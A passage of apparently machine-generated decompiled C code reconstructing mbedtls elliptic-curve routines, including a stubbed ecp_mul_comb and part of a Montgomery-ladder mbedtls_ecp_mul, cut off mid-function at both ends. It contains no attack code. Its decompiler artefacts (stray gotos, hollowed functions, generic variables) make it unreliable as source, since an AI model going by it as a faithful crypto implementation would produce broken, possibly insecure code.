                                                                                mbedtls_mpi_free((int32_t *)(*(int32_t *)(4 * g7 + g3) + 24));
                                                                                g1 = 0;
                                                                                v31 = (char *)((int32_t)v34 - 12);
                                                                                int32_t v53 = g7; // 0x805d9a7
                                                                                if (v53 != 0) {
                                                                                    int32_t v54 = v53 - 1; // 0x805d9af
                                                                                    g7 = v54;
                                                                                    if (v54 == 0) {
                                                                                        v32 = v31;
                                                                                        goto lab_0x805d856;
                                                                                    }
                                                                                    // 0x805d9ba
                                                                                    v29 = mbedtls_mpi_mul_mpi(&v7, &v5, (int32_t *)v31);
                                                                                    g1 = v29;
                                                                                    if (v29 == 0) {
                                                                                      lab_0x805d9db:
                                                                                        // 0x805d9db
                                                                                        g6 = g5;
                                                                                        g1 = v8;
                                                                                        int32_t v55 = ecp_modp((int32_t)(char *)&v7, v6); // 0x805d9e0
                                                                                        g1 = v55;
                                                                                        if (v55 == 0) {
                                                                                            int32_t v56 = *(int32_t *)(4 * g7 + g3); // 0x805d9ed
                                                                                            g216++;
                                                                                            int32_t v57 = mbedtls_mpi_mul_mpi(&v5, &v5, (int32_t *)(v56 + 24)); // 0x805da08
                                                                                            g1 = v57;
                                                                                            if (v57 == 0) {
                                                                                                // 0x805da15
                                                                                                g6 = g5;
                                                                                                g1 = v6;
                                                                                                v30 = ecp_modp((int32_t)(char *)&v5, v6);
                                                                                                g1 = v30;
                                                                                                if (v30 == 0) {
                                                                                                    // 0x805da23
                                                                                                    g216++;
                                                                                                    v34 = v31;
                                                                                                    // branch -> 0x805d870
                                                                                                    goto lab_0x805d870;
                                                                                                }
                                                                                            } else {
                                                                                                v30 = v57;
                                                                                            }
                                                                                        } else {
                                                                                            v30 = v55;
                                                                                        }
                                                                                    } else {
                                                                                        v30 = v29;
                                                                                    }
                                                                                } else {
                                                                                    v30 = 0;
                                                                                }
                                                                            } else {
                                                                                v30 = v52;
                                                                            }
                                                                        } else {
                                                                            v30 = v50;
                                                                        }
                                                                    } else {
                                                                        v30 = v48;
                                                                    }
                                                                } else {
                                                                    v30 = v47;
                                                                }
                                                            } else {
                                                                v30 = v44;
                                                            }
                                                        } else {
                                                            v30 = v43;
                                                        }
                                                    } else {
                                                        v30 = v40;
                                                    }
                                                } else {
                                                    v30 = v39;
                                                }
                                            } else {
                                                v30 = v36;
                                            }
                                        } else {
                                            v30 = v35;
                                        }
                                    } else {
                                        v30 = v33;
                                    }
                                } else {
                                    v31 = v28;
                                    // 0x805d9ba
                                    v29 = mbedtls_mpi_mul_mpi(&v7, &v5, (int32_t *)v31);
                                    g1 = v29;
                                    if (v29 == 0) {
                                        goto lab_0x805d9db;
                                    }
                                    // 0x805da93
                                    g7 = v27;
                                    v11 = v29;
                                    // branch -> 0x805da33
                                    // 0x805da33
                                    g3 = 0;
                                    g1 = mbedtls_mpi_free(&v5);
                                    g1 = mbedtls_mpi_free(&v7);
                                    mbedtls_mpi_free(&v9);
                                    g1 = v11;
                                    v12 = v4;
                                    int32_t v58 = g3; // 0x805da68
                                    // branch -> 0x805da68
                                    while (true) {
                                        // 0x805da68
                                        g3 = v58 + 1;
                                        g1 = mbedtls_mpi_free((int32_t *)v12);
                                        v13 = g3;
                                        if (g7 <= v13) {
                                            // 0x805da7a
                                            free(mem);
                                            // branch -> 0x805d741
                                            // 0x805d741
                                            return (char *)v11;
                                        }
                                      lab_0x805da68_2:
                                        // 0x805da68
                                        v12 += 12;
                                        v58 = v13;
                                        // branch -> 0x805da68
                                    }
                                }
                                // 0x805da93
                                g7 = v27;
                                v11 = v30;
                                // branch -> 0x805da33
                            }
                            // 0x805da33
                            g3 = 0;
                            g1 = mbedtls_mpi_free(&v5);
                            g1 = mbedtls_mpi_free(&v7);
                            mbedtls_mpi_free(&v9);
                            g1 = v11;
                            v12 = v4;
                            // branch -> 0x805da68
                            while (true) {
                                // 0x805da68
                                g3++;
                                g1 = mbedtls_mpi_free((int32_t *)v12);
                                v13 = g3;
                                if (g7 > v13) {
                                    goto lab_0x805da68_2;
                                }
                                // 0x805da7a
                                free(mem);
                                // branch -> 0x805d741
                                // 0x805d741
                                return (char *)v11;
                            }
                        }
                    }
                }
                // 0x805da30
                g7 = v16;
                // branch -> 0x805da33
            }
        }
        // 0x805da33
        g3 = 0;
        g1 = mbedtls_mpi_free(&v5);
        g1 = mbedtls_mpi_free(&v7);
        mbedtls_mpi_free(&v9);
        g1 = v11;
        v12 = v4;
        // branch -> 0x805da68
        while (true) {
            // 0x805da68
            g3++;
            g1 = mbedtls_mpi_free((int32_t *)v12);
            v13 = g3;
            if (g7 > v13) {
                goto lab_0x805da68_2;
            }
            // 0x805da7a
            free(mem);
            // branch -> 0x805d741
            // 0x805d741
            return (char *)v11;
        }
    }
    // 0x805d741
    return (char *)-0x4d80;
}

// Address range: 0x805daa0 - 0x805e41f
int32_t ecp_mul_comb(char * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    g3 = g1;
    int32_t v1;
    mbedtls_mpi_init(&v1);
    int32_t v2;
    mbedtls_mpi_init(&v2);
    mbedtls_mpi_get_bit(g1 + 76, 0);
    return -0x4f80;
}

// Address range: 0x805e420 - 0x805eebf
int32_t mbedtls_ecp_mul(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = g3; // 0x805e42c
    g3 = a1;
    int32_t v2 = g7; // 0x805e432
    g7 = a3;
    int32_t v3 = g5; // 0x805e438
    int32_t result2; // 0x805e463_2
    int32_t v4;
    if (mbedtls_mpi_cmp_int(a4 + 24, 1) == 0) {
        int32_t v5 = mbedtls_ecp_check_privkey(g3, g7); // 0x805e46f
        g1 = v5;
        if (v5 == 0) {
            int32_t v6 = mbedtls_ecp_check_pubkey(g3, a4); // 0x805e482
            g1 = v6;
            if (v6 == 0) {
                int32_t v7 = g3; // 0x805e48b
                int32_t v8 = *(int32_t *)(v7 + 48); // 0x805e48b
                g4 = v8;
                if (v8 == 0) {
                    // 0x805e452
                    g1 = -0x4f80;
                    // branch -> 0x805e457
                    // 0x805e457
                    g3 = v1;
                    g7 = v2;
                    g5 = v3;
                    g2 = v4;
                    return -0x4f80;
                }
                // 0x805e492
                if (*(int32_t *)(v7 + 60) == 0) {
                    // 0x805e4c0
                    int32_t v9;
                    int32_t v10 = &v9; // 0x805e4c0_0
                    g5 = v10;
                    mbedtls_ecp_point_init(v10);
                    int32_t v11;
                    int32_t v12 = &v11; // 0x805e4ce_0
                    mbedtls_mpi_init(&v11);
                    g1 = v12;
                    int32_t v13 = mbedtls_mpi_copy((char *)&v11, (int32_t *)a4); // 0x805e4e6
                    g1 = v13;
                    int32_t result = v13; // 0x805e4f0
                    if (v13 == 0) {
                        int32_t v14 = mbedtls_ecp_copy(g5, a4); // 0x805e51e
                        g1 = v14;
                        if (v14 == 0) {
                            int32_t v15 = mbedtls_mpi_lset((char *)a2, 1); // 0x805e535
                            g1 = v15;
                            if (v15 == 0) {
                                int32_t v16 = a2 + 24; // 0x805e549
                                char * v17 = (char *)v16;
                                int32_t v18 = mbedtls_mpi_lset(v17, 0); // 0x805e555
                                g1 = v18;
                                if (v18 == 0) {
                                    int32_t v19 = a2 + 12; // 0x805e561
                                    g1 = v19;
                                    mbedtls_mpi_free((int32_t *)v19);
                                    int32_t v20 = g3; // 0x805e56c
                                    int32_t v21 = v20 + 4; // 0x805e56c
                                    int32_t v22 = g7; // 0x805e56f
                                    g7 = v20;
                                    g3 = v21;
                                    int32_t * v23 = (int32_t *)v21;
                                    int32_t v24; // 0x805e5be_0
                                    int32_t v25;
                                    int32_t v26;
                                    int32_t v27; // 0x805e76e_0
                                    int32_t v28; // 0x805e779_0
                                    int32_t v29; // 0x805e784_0
                                    int32_t v30; // 0x805e78f_0
                                    int32_t v31; // 0x805e79a_0
                                    int32_t v32; // 0x805e7a5_0
                                    int32_t v33; // 0x805e7b0_0
                                    int32_t v34; // 0x805e7be_0
                                    int32_t v35; // 0x805e6c8
                                    int32_t v36; // 0x805ea0c
                                    int32_t v37; // 0x805ea2d
                                    int32_t v38; // 0x805ea3f
                                    int32_t v39; // 0x805ea64
                                    int32_t v40;
                                    int32_t v41;
                                    int32_t v42;
                                    int32_t v43;
                                    int32_t v44;
                                    int32_t v45;
                                    int32_t v46;
                                    int32_t v47;
                                    int32_t v48;
                                    int32_t v49;
                                    int32_t * v50;
                                    int32_t * v51;
                                    int32_t * v52;
                                    int32_t v53; // 0x805e5ad
                                    int32_t v54; // 0x805e6df
                                    uint32_t v55; // 0x805e5c7
                                    int32_t v56; // 0x805e6f698
                                    if (mbedtls_mpi_cmp_mpi((int32_t *)g5, v23) > 0) {
                                        int32_t v57;
                                        while (true) {
                                            int32_t v58 = g5; // 0x805e585
                                            int32_t v59 = mbedtls_mpi_sub_abs((int32_t *)v58, v58, g3); // 0x805e58c
                                            g1 = v59;
                                            result = v59;
                                            if (v59 == 0) {
                                                // 0x805e581
                                                v57 = g3;
                                                if (mbedtls_mpi_cmp_mpi((int32_t *)g5, (int32_t *)v57) <= 0) {
                                                    // break -> 0x805e5a9
                                                    break;
                                                }
                                                // continue -> 0x805e581
                                                continue;
                                            }
                                            // 0x805e4f0
                                            g1 = mbedtls_ecp_point_free(g5);
                                            mbedtls_mpi_free(&v11);
                                            g1 = result;
                                            // branch -> 0x805e457
                                            // 0x805e457
                                            g3 = v1;
                                            g7 = v2;
                                            g5 = v3;
                                            g2 = v4;
                                            return result;
                                        }
                                        // 0x805e5a9
                                        v53 = g7;
                                        g3 = v53;
                                        g7 = v22;
                                        if (a5 == 0) {
                                            // 0x805e5a9
                                            v26 = &v46;
                                            v25 = &v45;
                                            // branch -> 0x805e6c5
                                            // 0x805e6c5
                                            v35 = mbedtls_mpi_bitlen(v22, v57);
                                            g7 = v21;
                                            v54 = g3 + 16;
                                            v50 = (int32_t *)a2;
                                            v51 = (int32_t *)v16;
                                            v27 = &v47;
                                            v28 = &v48;
                                            v29 = &v49;
                                            v30 = &v40;
                                            v31 = &v41;
                                            v32 = &v42;
                                            v33 = &v43;
                                            v34 = &v44;
                                            v52 = (int32_t *)v25;
                                            v56 = v35;
                                            // branch -> 0x805e6e8
                                            while (true) {
                                                // 0x805e6e8
                                                if (v56 == 0) {
                                                    // 0x805e9f5
                                                    v36 = mbedtls_mpi_inv_mod(v16, v16, v21);
                                                    g1 = v36;
                                                    if (v36 == 0) {
                                                        // 0x805ea19
                                                        v37 = mbedtls_mpi_mul_mpi(v50, v50, v51);
                                                        g1 = v37;
                                                        if (v37 == 0) {
                                                            // 0x805ea3a
                                                            g1 = a2;
                                                            g6 = g3;
                                                            v38 = ecp_modp(a2, a2);
                                                            g1 = v38;
                                                            if (v38 == 0) {
                                                                // 0x805ea4c
                                                                g216++;
                                                                v39 = mbedtls_mpi_lset(v17, 1);
                                                                g1 = v39;
                                                                result = v39;
                                                                // branch -> 0x805e4f0
                                                                // 0x805e4f0
                                                                g1 = mbedtls_ecp_point_free(g5);
                                                                mbedtls_mpi_free(&v11);
                                                                g1 = result;
                                                                // branch -> 0x805e457
                                                                // 0x805e457
                                                                g3 = v1;
                                                                g7 = v2;
                                                                g5 = v3;
                                                                g2 = v4;
                                                                return result;
                                                            }
                                                            result = v38;
                                                        } else {
                                                            result = v37;
                                                        }
                                                    } else {
                                                        result = v36;
                                                    }
                                                } else {
                                                  lab_0x805e6f6_2:;
                                                    int32_t v60 = v56 - 1; // 0x805e6f6
                                                    uint32_t v61 = mbedtls_mpi_get_bit(g7, v60) % 256; // 0x805e71f
                                                    int32_t v62 = mbedtls_mpi_safe_cond_swap(v50, (int32_t *)g5, v61); // 0x805e72c
                                                    g1 = v62;
                                                    if (v62 == 0) {
                                                        int32_t v63 = mbedtls_mpi_safe_cond_swap(v51, &v45, v61); // 0x805e756
                                                        g1 = v63;
                                                        if (v63 == 0) {
                                                            // 0x805e763
                                                            mbedtls_mpi_init(&v46);
                                                            mbedtls_mpi_init(&v47);
                                                            mbedtls_mpi_init(&v48);
                                                            mbedtls_mpi_init(&v49);
                                                            mbedtls_mpi_init(&v40);
                                                            mbedtls_mpi_init(&v41);
                                                            mbedtls_mpi_init(&v42);
                                                            mbedtls_mpi_init(&v43);
                                                            mbedtls_mpi_init(&v44);
                                                            int32_t v64 = mbedtls_mpi_add_mpi(&v46, v50, v51); // 0x805e7e3
                                                            g1 = v64;
                                                            int32_t v65 = v64; // 0x805e81d
                                                            if (v64 != 0) {
                                                                // 0x805e81a
                                                                g1 = mbedtls_mpi_free(&v46);
                                                                g1 = mbedtls_mpi_free(&v47);
                                                                g1 = mbedtls_mpi_free(&v48);
                                                                g1 = mbedtls_mpi_free(&v49);
                                                                g1 = mbedtls_mpi_free(&v40);
                                                                g1 = mbedtls_mpi_free(&v41);
                                                                g1 = mbedtls_mpi_free(&v42);
                                                                g1 = mbedtls_mpi_free(&v43);
                                                                mbedtls_mpi_free(&v44);
                                                                g1 = v65;
                                                                result = v65;
                                                                // branch -> 0x805e4f0
                                                                // 0x805e4f0
                                                                g1 = mbedtls_ecp_point_free(g5);
                                                                mbedtls_mpi_free(&v11);
                                                                g1 = result;
                                                                // branch -> 0x805e457
                                                                // 0x805e457
                                                                g3 = v1;
                                                                g7 = v2;
                                                                g5 = v3;
                                                                g2 = v4;
                                                                return result;
                                                            }
                                                            while (true) {
                                                                // 0x805e7ec
                                                                if (mbedtls_mpi_cmp_mpi(&v46, (int32_t *)g7) < 0) {
                                                                    int32_t v66 = mbedtls_mpi_mul_mpi(&v47, &v46, &v46); // 0x805e8a5
                                                                    g1 = v66;
                                                                    if (v66 == 0) {
                                                                        // 0x805e8b2
                                                                        g6 = g3;
                                                                        g1 = v27;
                                                                        int32_t v67 = ecp_modp(v27, v26); // 0x805e8b7
                                                                        g1 = v67;
                                                                        if (v67 == 0) {
                                                                            // 0x805e8c4
                                                                            g216++;
                                                                            int32_t v68 = mbedtls_mpi_sub_mpi(&v48, v50, v51); // 0x805e8e2
                                                                            g1 = v68;
                                                                            if (v68 == 0) {
                                                                                while (true) {
                                                                                    // 0x805e922
                                                                                    if (v48 < 0) {
                                                                                        // 0x805e8f0
                                                                                        if (mbedtls_mpi_cmp_int(v28, 0) != 0) {
                                                                                            int32_t v69 = mbedtls_mpi_add_mpi(&v48, &v48, (int32_t *)g7); // 0x805e915
                                                                                            g1 = v69;
                                                                                            if (v69 != 0) {
                                                                                                v65 = v69;
                                                                                                // break -> 0x805e81a
                                                                                                break;
                                                                                            }
                                                                                            // continue -> 0x805e922
                                                                                            continue;
                                                                                        }
                                                                                    }
                                                                                    int32_t v70 = mbedtls_mpi_mul_mpi(&v49, &v48, &v48); // 0x805e939
                                                                                    g1 = v70;
                                                                                    if (v70 == 0) {
                                                                                        // 0x805e946
                                                                                        g6 = g3;
                                                                                        g1 = v29;
                                                                                        int32_t v71 = ecp_modp(v29, v28); // 0x805e94b
                                                                                        g1 = v71;
                                                                                        if (v71 == 0) {
                                                                                            // 0x805e958
                                                                                            g216++;
                                                                                            int32_t v72 = mbedtls_mpi_sub_mpi(&v40, &v47, &v49); // 0x805e973
                                                                                            g1 = v72;
                                                                                            if (v72 == 0) {
                                                                                                while (true) {
                                                                                                    // 0x805e980
                                                                                                    if (v40 <= 0) {
                                                                                                        // 0x805e98a
                                                                                                        if (mbedtls_mpi_cmp_int(v30, 0) != 0) {
                                                                                                            int32_t v73 = mbedtls_mpi_add_mpi(&v40, &v40, (int32_t *)g7); // 0x805e9b3
                                                                                                            g1 = v73;
                                                                                                            if (v73 != 0) {
                                                                                                                v65 = v73;
                                                                                                                // break -> 0x805e81a
                                                                                                                break;
                                                                                                            }
                                                                                                            // continue -> 0x805e980
                                                                                                            continue;
                                                                                                        }
                                                                                                    }
                                                                                                    int32_t v74 = mbedtls_mpi_add_mpi(&v41, (int32_t *)g5, &v45); // 0x805ea8c
                                                                                                    g1 = v74;
                                                                                                    if (v74 == 0) {
                                                                                                        while (true) {
                                                                                                            // 0x805ea99
                                                                                                            if (mbedtls_mpi_cmp_mpi(&v41, (int32_t *)g7) < 0) {
                                                                                                                int32_t v75 = mbedtls_mpi_sub_mpi(&v42, (int32_t *)g5, &v45); // 0x805eadc
                                                                                                                g1 = v75;
                                                                                                                if (v75 == 0) {
                                                                                                                    while (true) {
                                                                                                                        // 0x805eae9
                                                                                                                        if (v42 <= 0) {
                                                                                                                            // 0x805eaef
                                                                                                                            if (mbedtls_mpi_cmp_int(v32, 0) != 0) {
                                                                                                                                int32_t v76 = mbedtls_mpi_add_mpi(&v42, &v42, (int32_t *)g7); // 0x805eb14
                                                                                                                                g1 = v76;
                                                                                                                                if (v76 != 0) {
                                                                                                                                    v65 = v76;
                                                                                                                                    // break -> 0x805e81a
                                                                                                                                    break;
                                                                                                                                }
                                                                                                                                // continue -> 0x805eae9
                                                                                                                                continue;
                                                                                                                            }
                                                                                                                        }
                                                                                                                        int32_t v77 = mbedtls_mpi_mul_mpi(&v43, &v42, &v46); // 0x805eb39
                                                                                                                        g1 = v77;
                                                                                                                        if (v77 == 0) {
                                                                                                                            // 0x805eb46
                                                                                                                            g6 = g3;
                                                                                                                            g1 = v33;
                                                                                                                            int32_t v78 = ecp_modp(v33, v32); // 0x805eb4e
                                                                                                                            g1 = v78;
                                                                                                                            if (v78 == 0) {
                                                                                                                                // 0x805eb5b
                                                                                                                                g216++;
                                                                                                                                int32_t v79 = mbedtls_mpi_mul_mpi(&v44, &v41, &v48); // 0x805eb79
                                                                                                                                g1 = v79;
                                                                                                                                if (v79 == 0) {
                                                                                                                                    // 0x805eb86
                                                                                                                                    g6 = g3;
                                                                                                                                    g1 = v34;
                                                                                                                                    int32_t v80 = ecp_modp(v34, v31); // 0x805eb8e
                                                                                                                                    g1 = v80;
                                                                                                                                    if (v80 == 0) {
                                                                                                                                        // 0x805eb9b
                                                                                                                                        g216++;
                                                                                                                                        int32_t v81 = g5; // 0x805ebb6
                                                                                                                                        int32_t v82 = mbedtls_mpi_add_mpi((int32_t *)v81, &v43, &v44); // 0x805ebb9
                                                                                                                                        g1 = v82;
                                                                                                                                        if (v82 == 0) {
                                                                                                                                            // 0x805ebc6
                                                                                                                                            g6 = g3;
                                                                                                                                            g1 = v10;
                                                                                                                                            int32_t v83 = ecp_modp(v81, v33); // 0x805ebca
                                                                                                                                            g1 = v83;
                                                                                                                                            if (v83 == 0) {
                                                                                                                                                // 0x805ebd7
                                                                                                                                                g216++;
                                                                                                                                                int32_t v84 = g5; // 0x805ebde
                                                                                                                                                int32_t * v85 = (int32_t *)v84;
                                                                                                                                                int32_t v86 = mbedtls_mpi_mul_mpi(v85, v85, v85); // 0x805ebe9
                                                                                                                                                g1 = v86;
                                                                                                                                                if (v86 == 0) {
                                                                                                                                                    // 0x805ebf6
                                                                                                                                                    g6 = g3;
                                                                                                                                                    g1 = v10;
                                                                                                                                                    int32_t v87 = ecp_modp(v84, v84); // 0x805ebfa
                                                                                                                                                    g1 = v87;
                                                                                                                                                    if (v87 == 0) {
                                                                                                                                                        // 0x805ec07
                                                                                                                                                        g216++;
                                                                                                                                                        int32_t v88 = mbedtls_mpi_sub_mpi(&v45, &v43, &v44); // 0x805ec2b
                                                                                                                                                        g1 = v88;
                                                                                                                                                        if (v88 == 0) {
                                                                                                                                                            while (true) {
                                                                                                                                                                // 0x805ec38
                                                                                                                                                                if (v45 <= 0) {
                                                                                                                                                                    // 0x805ec41
                                                                                                                                                                    if (mbedtls_mpi_cmp_int(v25, 0) != 0) {
                                                                                                                                                                        int32_t v89 = mbedtls_mpi_add_mpi(&v45, &v45, (int32_t *)g7); // 0x805ec6c
                                                                                                                                                                        g1 = v89;
                                                                                                                                                                        if (v89 != 0) {
                                                                                                                                                                            v65 = v89;
                                                                                                                                                                            // break -> 0x805e81a
                                                                                                                                                                            break;
                                                                                                                                                                        }
                                                                                                                                                                        // continue -> 0x805ec38
                                                                                                                                                                        continue;
                                                                                                                                                                    }
                                                                                                                                                                }
                                                                                                                                                                int32_t v90 = mbedtls_mpi_mul_mpi(&v45, &v45, &v45); // 0x805ec8b
                                                                                                                                                                g1 = v90;
                                                                                                                                                                if (v90 == 0) {
                                                                                                                                                                    // 0x805ec98
                                                                                                                                                                    g6 = g3;
                                                                                                                                                                    g1 = v25;
                                                                                                                                                                    int32_t v91 = ecp_modp(v25, v25); // 0x805eca0
                                                                                                                                                                    g1 = v91;
                                                                                                                                                                    if (v91 == 0) {
                                                                                                                                                                        // 0x805ecad
                                                                                                                                                                        g216++;
                                                                                                                                                                        int32_t v92 = mbedtls_mpi_mul_mpi(v52, &v11, v52); // 0x805ecc8
                                                                                                                                                                        g1 = v92;
                                                                                                                                                                        if (v92 == 0) {
                                                                                                                                                                            // 0x805ecd5
                                                                                                                                                                            g6 = g3;
                                                                                                                                                                            g1 = v25;
                                                                                                                                                                            int32_t v93 = ecp_modp(v25, v12); // 0x805ecdd
                                                                                                                                                                            g1 = v93;
                                                                                                                                                                            if (v93 == 0) {
                                                                                                                                                                                // 0x805ecea
                                                                                                                                                                                g216++;
                                                                                                                                                                                int32_t v94 = mbedtls_mpi_mul_mpi(v50, &v47, &v49); // 0x805ed05
                                                                                                                                                                                g1 = v94;
                                                                                                                                                                                if (v94 == 0) {
                                                                                                                                                                                    // 0x805ed12
                                                                                                                                                                                    g1 = a2;
                                                                                                                                                                                    g6 = g3;
                                                                                                                                                                                    int32_t v95 = ecp_modp(a2, v27); // 0x805ed17
                                                                                                                                                                                    g1 = v95;
                                                                                                                                                                                    if (v95 == 0) {
                                                                                                                                                                                        // 0x805ed24
                                                                                                                                                                                        g216++;
                                                                                                                                                                                        int32_t v96 = mbedtls_mpi_mul_mpi(v51, (int32_t *)v54, &v40); // 0x805ed45
                                                                                                                                                                                        g1 = v96;
                                                                                                                                                                                        if (v96 == 0) {
                                                                                                                                                                                            // 0x805ed52
                                                                                                                                                                                            g1 = v16;
                                                                                                                                                                                            g6 = g3;
                                                                                                                                                                                            int32_t v97 = ecp_modp(v16, v54); // 0x805ed5a
                                                                                                                                                                                            g1 = v97;
                                                                                                                                                                                            if (v97 == 0) {
                                                                                                                                                                                                // 0x805ed67
                                                                                                                                                                                                g216++;
                                                                                                                                                                                                int32_t v98 = mbedtls_mpi_add_mpi(v51, &v49, v51); // 0x805ed82
                                                                                                                                                                                                g1 = v98;
                                                                                                                                                                                                if (v98 == 0) {
                                                                                                                                                                                                    int32_t v99 = g3; // 0x805ed8f
                                                                                                                                                                                                    g3 = v16;
                                                                                                                                                                                                    int32_t v100; // 0x805edde
                                                                                                                                                                                                    if (mbedtls_mpi_cmp_mpi(v51, (int32_t *)g7) >= 0) {
                                                                                                                                                                                                        while (true) {
                                                                                                                                                                                                            int32_t v101 = g3; // 0x805edaf
                                                                                                                                                                                                            int32_t v102 = mbedtls_mpi_sub_abs((int32_t *)v101, v101, g7); // 0x805edb6
                                                                                                                                                                                                            g1 = v102;
                                                                                                                                                                                                            if (v102 == 0) {
                                                                                                                                                                                                                // 0x805edab
                                                                                                                                                                                                                if (mbedtls_mpi_cmp_mpi((int32_t *)g3, (int32_t *)g7) < 0) {
                                                                                                                                                                                                                    // break -> 0x805edc4
                                                                                                                                                                                                                    break;
                                                                                                                                                                                                                }
                                                                                                                                                                                                                // continue -> 0x805edab
                                                                                                                                                                                                                continue;
                                                                                                                                                                                                            }
                                                                                                                                                                                                        }
                                                                                                                                                                                                        // 0x805edc4
                                                                                                                                                                                                        g3 = v99;
                                                                                                                                                                                                        v100 = mbedtls_mpi_mul_mpi(v51, &v40, v51);
                                                                                                                                                                                                        g1 = v100;
                                                                                                                                                                                                        if (v100 == 0) {
                                                                                                                                                                                                            goto lab_0x805edeb;
                                                                                                                                                                                                        }
                                                                                                                                                                                                        v65 = v100;
                                                                                                                                                                                                        // 0x805e81a
                                                                                                                                                                                                        g1 = mbedtls_mpi_free(&v46);
                                                                                                                                                                                                        g1 = mbedtls_mpi_free(&v47);
                                                                                                                                                                                                        g1 = mbedtls_mpi_free(&v48);
                                                                                                                                                                                                        g1 = mbedtls_mpi_free(&v49);
                                                                                                                                                                                                        g1 = mbedtls_mpi_free(&v40);
                                                                                                                                                                                                        g1 = mbedtls_mpi_free(&v41);
                                                                                                                                                                                                        g1 = mbedtls_mpi_free(&v42);
                                                                                                                                                                                                        g1 = mbedtls_mpi_free(&v43);
                                                                                                                                                                                                        mbedtls_mpi_free(&v44);
                                                                                                                                                                                                        g1 = v65;
                                                                                                                                                                                                        result = v65;
                                                                                                                                                                                                        // branch -> 0x805e4f0
                                                                                                                                                                                                        // 0x805e4f0
                                                                                                                                                                                                        g1 = mbedtls_ecp_point_free(g5);
                                                                                                                                                                                                        mbedtls_mpi_free(&v11);
                                                                                                                                                                                                        g1 = result;
                                                                                                                                                                                                        // branch -> 0x805e457
                                                                                                                                                                                                        // 0x805e457
                                                                                                                                                                                                        g3 = v1;
                                                                                                                                                                                                        g7 = v2;
                                                                                                                                                                                                        g5 = v3;
                                                                                                                                                                                                        g2 = v4;
                                                                                                                                                                                                        return result;
                                                                                                                                                                                                    }
                                                                                                                                                                                                    // 0x805edc4
                                                                                                                                                                                                    g3 = v99;
                                                                                                                                                                                                    v100 = mbedtls_mpi_mul_mpi(v51, &v40, v51);
                                                                                                                                                                                                    g1 = v100;
                                                                                                                                                                                                    if (v100 == 0) {
                                                                                                                                                                                                      lab_0x805edeb:
                                                                                                                                                                                                        // 0x805edeb
                                                                                                                                                                                                        g1 = v16;
                                                                                                                                                                                                        g6 = g3;
                                                                                                                                                                                                        int32_t v103 = ecp_modp(v16, v30); // 0x805edf3
                                                                                                                                                                                                        g1 = v103;
                                                                                                                                                                                                        if (v103 == 0) {
                                                                                                                                                                                                            // 0x805ee00
                                                                                                                                                                                                            g1 = v26;
                                                                                                                                                                                                            g216++;
                                                                                                                                                                                                            g1 = mbedtls_mpi_free((int32_t *)v26);
                                                                                                                                                                                                            mbedtls_mpi_free(&v47);
                                                                                                                                                                                                            g1 = v28;
                                                                                                                                                                                                            g1 = mbedtls_mpi_free(&v48);
                                                                                                                                                                                                            mbedtls_mpi_free(&v49);
                                                                                                                                                                                                            g1 = v30;
                                                                                                                                                                                                            g1 = mbedtls_mpi_free(&v40);
                                                                                                                                                                                                            mbedtls_mpi_free(&v41);
                                                                                                                                                                                                            g1 = v32;
                                                                                                                                                                                                            g1 = mbedtls_mpi_free(&v42);
                                                                                                                                                                                                            mbedtls_mpi_free(&v43);
                                                                                                                                                                                                            g1 = v34;
                                                                                                                                                                                                            mbedtls_mpi_free(&v44);
                                                                                                                                                                                                            int32_t v104 = mbedtls_mpi_safe_cond_swap(v50, (int32_t *)g5, v61); // 0x805ee84
                                                                                                                                                                                                            g1 = v104;
                                                                                                                                                                                                            result = v104;
                                                                                                                                                                                                            if (v104 == 0) {
                                                                                                                                                                                                                int32_t v105 = mbedtls_mpi_safe_cond_swap(v51, &v45, v61); // 0x805eeae
                                                                                                                                                                                                                g1 = v105;
                                                                                                                                                                                                                if (v105 != 0) {
                                                                                                                                                                                                                    result = v105;
                                                                                                                                                                                                                    // break (via goto) -> 0x805e4f0
                                                                                                                                                                                                                    goto lab_0x805e4f0;
                                                                                                                                                                                                                }
                                                                                                                                                                                                                v56 = v60;
                                                                                                                                                                                                                // continue (via goto) -> 0x805e6e8
                                                                                                                                                                                                                goto lab_0x805e6e8;
                                                                                                                                                                                                            }
                                                                                                                                                                                                            // 0x805e4f0
                                                                                                                                                                                                            g1 = mbedtls_ecp_point_free(g5);
                                                                                                                                                                                                            mbedtls_mpi_free(&v11);
                                                                                                                                                                                                            g1 = result;
                                                                                                                                                                                                            // branch -> 0x805e457
                                                                                                                                                                                                            // 0x805e457
                                                                                                                                                                                                            g3 = v1;
                                                                                                                                                                                                            g7 = v2;
                                                                                                                                                                                                            g5 = v3;
                                                                                                                                                                                                            g2 = v4;
                                                                                                                                                                                                            return result;
                                                                                                                                                                                                        }
                                                                                                                                                                                                        v65 = v103;
                                                                                                                                                                                                    } else {
                                                                                                                                                                                                        v65 = v100;
                                                                                                                                                                                                    }
                                                                                                                                                                                                    // 0x805e81a
                                                                                                                                                                                                    g1 = mbedtls_mpi_free(&v46);
                                                                                                                                                                                                    g1 = mbedtls_mpi_free(&v47);
                                                                                                                                                                                                    g1 = mbedtls_mpi_free(&v48);
                                                                                                                                                                                                    g1 = mbedtls_mpi_free(&v49);
                                                                                                                                                                                                    g1 = mbedtls_mpi_free(&v40);
                                                                                                                                                                                                    g1 = mbedtls_mpi_free(&v41);
                                                                                                                                                                                                    g1 = mbedtls_mpi_free(&v42);
                                                                                                                                                                                                    g1 = mbedtls_mpi_free(&v43);
                                                                                                                                                                                                    mbedtls_mpi_free(&v44);
                                                                                                                                                                                                    g1 = v65;
                                                                                                                                                                                                    result = v65;
                                                                                                                                                                                                    // branch -> 0x805e4f0
                                                                                                                                                                                                    // 0x805e4f0
                                                                                                                                                                                                    g1 = mbedtls_ecp_point_free(g5);
                                                                                                                                                                                                    mbedtls_mpi_free(&v11);
                                                                                                                                                                                                    g1 = result;
                                                                                                                                                                                                    // branch -> 0x805e457
                                                                                                                                                                                                    // 0x805e457
                                                                                                                                                                                                    g3 = v1;
                                                                                                                                                                                                    g7 = v2;
                                                                                                                                                                                                    g5 = v3;
                                                                                                                                                                                                    g2 = v4;
                                                                                                                                                                                                    return result;
                                                                                                                                                                                                }
                                                                                                                                                                                                v65 = v98;
                                                                                                                                                                                            } else {
                                                                                                                                                                                                v65 = v97;
                                                                                                                                                                                            }
                                                                                                                                                                                        } else {
                                                                                                                                                                                            v65 = v96;
                                                                                                                                                                                        }
                                                                                                                                                                                    } else {
                                                                                                                                                                                        v65 = v95;
                                                                                                                                                                                    }
                                                                                                                                                                                } else {
